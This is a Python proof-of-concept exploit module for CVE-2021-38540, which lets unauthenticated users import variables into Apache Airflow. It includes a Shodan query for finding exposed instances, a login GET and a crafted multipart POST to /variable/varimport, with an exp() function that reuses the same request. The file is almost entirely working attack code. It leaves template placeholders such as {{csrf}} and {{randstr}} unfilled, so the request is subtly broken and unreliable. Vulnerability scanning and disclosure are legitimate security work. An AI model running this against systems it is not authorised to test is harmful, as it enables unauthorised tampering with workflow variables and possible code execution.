import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Apache Airflow - Unauthenticated Variable Import''',
        "description": '''The variable import endpoint was not protected by authentication in Airflow >=2.0.0, <2.1.3. This allowed unauthenticated users to hit that endpoint to add/modify Airflow variables used in DAGs, potentially resulting in a denial of service, information disclosure or remote code execution. This issue affects Apache Airflow >=2.0.0, <2.1.3.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2021-38540"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-38540",
            "cwe-id": "CWE-306"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''title:"Sign In - Airflow"'''
        },
        "tags": ["cve", "cve2021", "apache", "airflow", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/login/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/variable/varimport"""
        method = "POST"
        data = """------WebKitFormBoundaryB874qcjbpxTP1Hj7
Content-Disposition: form-data; name="csrf_token"

{{csrf}}
------WebKitFormBoundaryB874qcjbpxTP1Hj7
Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
Content-Type: application/json

{
    "type": "{{randstr}}"
}

------WebKitFormBoundaryB874qcjbpxTP1Hj7--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""You should be redirected automatically to target URL: <a href="/">""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url